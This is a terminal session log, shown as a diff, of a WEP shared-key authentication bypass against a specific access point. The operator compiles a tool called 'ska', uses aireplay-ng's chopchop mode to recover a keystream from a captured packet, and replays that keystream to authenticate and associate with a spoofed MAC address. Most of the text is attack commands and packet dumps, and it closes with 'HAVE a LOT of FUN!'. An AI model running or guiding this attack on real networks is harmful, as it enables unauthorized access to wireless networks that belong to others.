@@ -1,0 +1,177 @@
+haquetop2:~/Desktop/shared key hack/ska-0.2 # l
+total 37
+drwxr-xr-x 2 root root   128 Sep 12 18:52 ./
+drwxr-xr-- 4 root root  1040 Sep 12 18:16 ../
+-rwxrwxrwx 1 root root 10013 Nov 12  2005 crctable.h*
+-rwxr--r-- 1 root root  1037 Mar  9  2006 pcap.h*
+-rwxr--r-- 1 root root 19323 Sep 12 18:41 ska.c*
+haquetop2:~/Desktop/shared key hack/ska-0.2 # gcc -o ska ska.c
+haquetop2:~/Desktop/shared key hack/ska-0.2 # aireplay-ng -4 rausb0
+Read 8 packets...
+
+        Size: 78, FromDS: 1, ToDS: 0 (WEP)
+
+             BSSID  =  00:0F:B5:59:29:16
+         Dest. MAC  =  01:80:C2:00:00:00
+        Source MAC  =  00:C1:26:0A:21:D7
+
+        0x0000:  0842 9500 0180 c200 0000 000f b559 2916  .B...........Y).
+        0x0010:  00c1 260a 21d7 100e 0007 9e00 2312 84ec  ..&.!.......#...
+        0x0020:  342a 6554 398d 1635 95a5 0375 3109 8448  4*eT9..5...u1..H
+        0x0030:  42c9 e8ac 3f01 9485 9a71 0a28 1f89 cde2  B...?....q.(....
+        0x0040:  f7e3 43f8 0344 2679 60be 59c8 1533       ..C..D&y`.Y..3
+
+Use this packet ? n
+
+[...]
+
+Read 94 packets...
+
+        Size: 278, FromDS: 1, ToDS: 0 (WEP)
+
+             BSSID  =  00:0F:B5:59:29:16
+         Dest. MAC  =  00:12:F0:2E:B9:34
+        Source MAC  =  02:C1:26:0A:21:D7
+
+        0x0000:  0842 9500 0012 f02e b934 000f b559 2916  .B.......4...Y).
+        0x0010:  02c1 260a 21d7 e013 0007 a400 35ea 7bbd  ..&.!.......5.{.
+        0x0020:  afd3 f61a 6b4c fa6a e7ee 079c 4e15 41f4  ....kL.j....N.A.
+        0x0030:  d0f2 9efe 83f0 3aee 3822 3ff3 5103 7e71  ......:.8"?.Q.~q
+        0x0040:  797e 55f0 2628 77d7 0a45 d278 83af c32b  y~U.&(w..E.x...+
+        0x0050:  1af5 aec8 52b0 15a7 2dc7 d237 05bc 998f  ....R...-..7....
+        0x0060:  9c9c 3fbd 40ae f1e6 8eaf 9401 9f00 65ae  ..?.@.........e.
+        0x0070:  5c25 a02b d0d6 c760 7282 6ea0 2a81 6ccd  \%.+...`r.n.*.l.
+        0x0080:  ae64 b1ca 4366 6b8d 9a80 9032 c957 c571  .d..Cfk....2.W.q
+        0x0090:  0623 fb72 d98b 02cb e89f b60b 0daa 9c7a  .#.r...........z
+        0x00a0:  edbb bd0e 4f3a 035b ebfa eaf3 b154 26e4  ....O:.[.....T&.
+        0x00b0:  524e 5eba dd26 887c ff80 2a2a d5db a2c9  RN^..&.|..**....
+        0x00c0:  b286 4402 afd3 85e2 b0e2 3290 fe76 5a39  ..D.......2..vZ9
+        0x00d0:  a1ee 0b3a 1c03 06f2 16d6 c3e8 88aa 2fd2  ...:........../.
+        --- CUT ---
+
+Use this packet ? y
+
+Saving chosen packet in replay_src-0912-185342.cap
+
+Offset  277 ( 0% done) | xor = BB | pt = F5 |  104 frames written in   312ms
+Offset  276 ( 0% done) | xor = 06 | pt = 6D |  152 frames written in   457ms
+Offset  275 ( 0% done) | xor = F7 | pt = 33 |  102 frames written in   306ms
+[...]
+Offset   38 (97% done) | xor = FA | pt = 00 |  228 frames written in   684ms
+Offset   37 (98% done) | xor = 4C | pt = 00 |  231 frames written in   693ms
+Offset   36 (98% done) | xor = 2E | pt = 45 |   18 frames written in    54ms
+Offset   35 (99% done) | xor = 1A | pt = 00 |  229 frames written in   687ms
+Offset   34 (99% done) | xor = FE | pt = 08 |  147 frames written in   441ms
+
+Saving plaintext in replay_dec-0912-185527.cap
+Saving keystream in replay_dec-0912-185527.xor
+
+Completed in 104s (2.31 bytes/s)
+
+haquetop2:~/Desktop/shared key hack/ska-0.2 # time ./ska rausb0 "bl33d 1337" 00:0F:B5:59:29:16 00:00:11:11:22:22 replay_dec-0912-185527.xor
+Step1: Auth
+
+        Size: 30, FromDS: 0, ToDS: 0
+        0x0000:  b000 3a01 000f b559 2916 0000 1111 2222  ..:....Y).....""
+        0x0010:  000f b559 2916 b001 0100 0100 0000       ...Y).........
+
+
+Step2: Response
+
+        Size: 160, FromDS: 0, ToDS: 0
+        0x0000:  b000 2c01 0000 1111 2222 000f b559 2916  ..,.....""...Y).
+        0x0010:  000f b559 2916 d080 0100 0200 0000 1080  ...Y)...........
+        0x0020:  64a2 811b 4353 9f18 d80a be14 10ac 8560  d...CS.........`
+        0x0030:  0aef ce55 5238 543f e4c8 1635 d217 5e70  ...UR8T?...5..^p
+        0x0040:  6afc 2e3f 8022 5314 cbc8 0e69 4a46 9018  j..?."S....iJF..
+        0x0050:  2193 a87f c54a 3c66 adb9 3b0c 63cf b26a  !...J<f..;.c..j
+        0x0060:  b8b1 1f72 f4c6 e830 fc10 1f1f ff71 134f  ...r...0.....q.O
+        0x0070:  f531 9c27 e9d9 ca10 d488 2311 53ee d03a  .1.'......#.S..:
+        0x0080:  4943 2744 f0fc 942b beba da15 5bd9 0534  IC'D...+....[..4
+        0x0090:  ea42 280a 1c19 8a71 884e bf39 6264 c125  .B(....q.N.9bd.%
+
+IV + KeyIndex used: 0007a4 00
+
+PRGA XOR Values used to fake auth:
+        Size: 250, FromDS: 0, ToDS: 0
+        0x0000:  9f40 78bd afd3 fe1a 2e4c fa84 4de2 479c  .@x......L..M.G.
+        0x0010:  2313 04c1 90fe 83ec 4358 3aec 2c64 2f46  #.......CX:.,d/F
+        0x0020:  15f3 81b7 6b87 e16f 7630 37d7 5c66 d278  ....k..ov07.\f.x
+        0x0030:  a9ad ff0f 1a35 aecb 52bb 15a7 8d63 11c6  .....5..R....c..
+        0x0040:  0d89 afbe abab 078d 76ae f1e6 86af 9501  ........v.......
+        0x0050:  9d00 35ae 5025 852b d0d6 c760 7282 6ea4  ..5.P%.+...`r.n.
+        0x0060:  2a88 5a3c 6031 b1ca 2541 6b8d 9a81 9032  *.Z<`1..%Ak....2
+        0x0070:  c957 c571 0623 fb72 d98b 02cb e895 b60f  .W.q.#.r........
+        0x0080:  0daa 9c7a edbd bd0a 5f3a 035b ebf7 eaa3  ...z...._:.[....
+        0x0090:  b812 35ad 1e31 4f6b 5f04 cc39 acd4 2a2a  ..5..1Ok_..9..**
+        0x00a0:  dc9d b185 fef9 55d3 2df1 c1a7 e3b6 3290  ......U.-.....2.
+        0x00b0:  f730 4977 ed91 1aeb 9e21 42b7 4582 c3e8  .0Iw.....!B.E...
+        0x00c0:  81ec 3c91 c019 4802 e395 6a47 a9eb 8858  ..<...H...jG...X
+        0x00d0:  f2f0 e029 6326 60a4 e257 a6e8 ff82 5f61  ...)c&`..W...._a
+        --- CUT ---
+
+Plaintext of packet to be encrypted and sent back:
+        Size: 164, FromDS: 0, ToDS: 0
+        0x0000:  b000 2c01 0000 1111 2222 000f b559 2916  ..,.....""...Y).
+        0x0010:  000f b559 2916 d080 0100 0300 0000 1080  ...Y)...........
+        0x0020:  64a2 811b 4353 9f18 d80a be14 10ac 8560  d...CS.........`
+        0x0030:  0aef ce55 5238 543f e4c8 1635 d217 5e70  ...UR8T?...5..^p
+        0x0040:  6afc 2e3f 8022 5314 cbc8 0e69 4a46 9018  j..?."S....iJF..
+        0x0050:  2193 a87f c54a 3c66 adb9 3b0c 63cf b26a  !...J<f..;.c..j
+        0x0060:  b8b1 1f72 f4c6 e830 fc10 1f1f ff71 134f  ...r...0.....q.O
+        0x0070:  f531 9c27 e9d9 ca10 d488 2311 53ee d03a  .1.'......#.S..:
+        0x0080:  4943 2744 f0fc 942b beba da15 5bd9 0534  IC'D...+....[..4
+        0x0090:  ea42 280a 1c19 8a71 884e bf39 6264 c125  .B(....q.N.9bd.%
+        0x00a0:  ab58 d6aa                                .X..
+
+
+Step 3: Sending packet with encrypted challenge:
+        Size: 168, FromDS: 0, ToDS: 0
+        0x0000:  b040 3a01 000f b559 2916 0000 1111 2222  .@:....Y).....""
+        0x0010:  000f b559 2916 c001 0007 a400 9e40 7bbd  ...Y)........@{.
+        0x0020:  afd3 ee9a 4aee 7b9f 0eb1 d884 fb19 bad5  ....J.{.........
+        0x0030:  8052 068c 49b7 f4b9 7e5c 7b79 f13b 9782  .R..I...~\{y.;..
+        0x0040:  b990 bf1f 1ccc 19e8 dc44 816c 6265 f166  .........D.lbe.f
+        0x0050:  5073 3ed3 7328 bdd8 4829 2da0 a030 94b2  Ps>.s(..H)-..0..
+        0x0060:  c864 b5e7 ce1f ee94 7269 7d31 6110 2ab1  .d......ri}1a.*.
+        0x0070:  af54 9664 25e7 5b47 9b5b a4b4 fe00 792d  .T.d%.[G.[....y-
+        0x0080:  33df 61f0 6c02 4cc9 6a7d 0419 77ed 1f64  3.a.l.L.j}..w..d
+        0x0090:  5dfa fe46 33c9 2ac1 f48c 3c7e 85e4 2343  ]..F3.*...<~..#C
+        0x00a0:  8fd9 7c2f f462 d5f1                      ..|/.b..
+
+
+Step 4: Answer packet:
+        Size: 30, FromDS: 0, ToDS: 0
+        0x0000:  b000 2c01 0000 1111 2222 000f b559 2916  ..,.....""...Y).
+        0x0010:  000f b559 2916 e080 0100 0400 0000       ...Y).........
+
+Code 0 - Authentication SUCCESSFUL after trying 1 times to authenticate :)
+
+Capability Field from Beacon Frame:
+        Size: 2, FromDS: 0, ToDS: 0
+        0x0000:  1500                                     ..
+
+
+Step 5: Sending association request:
+        Size: 56, FromDS: 0, ToDS: 0
+        0x0000:  0000 3a01 000f b559 2916 0000 1111 2222  ..:....Y).....""
+        0x0010:  000f b559 2916 d001 1500 0a00 000a 626c  ...Y).........bl
+        0x0020:  3333 6420 3133 3337 0104 0204 0b16 3208  33d 1337......2.
+        0x0030:  0c12 1824 3048 606c                      ...$0H`l
+
+
+Step 6: Association Response:
+        Size: 36, FromDS: 0, ToDS: 0
+        0x0000:  1000 2c01 0000 1111 2222 000f b559 2916  ..,.....""...Y).
+        0x0010:  000f b559 2916 0081 1500 0000 02c0 0104  ...Y)...........
+        0x0020:  8284 8b96                                ....
+
+Code 0 - Association SUCCESSFUL after trying 1 times to authenticate and 1 times to associate:)
+
+real    0m0.196s
+user    0m0.000s
+sys     0m0.008s
+haquetop2:~/Desktop/shared key hack/ska-0.2 # 
+
+
+HAVE a LOT of FUN!
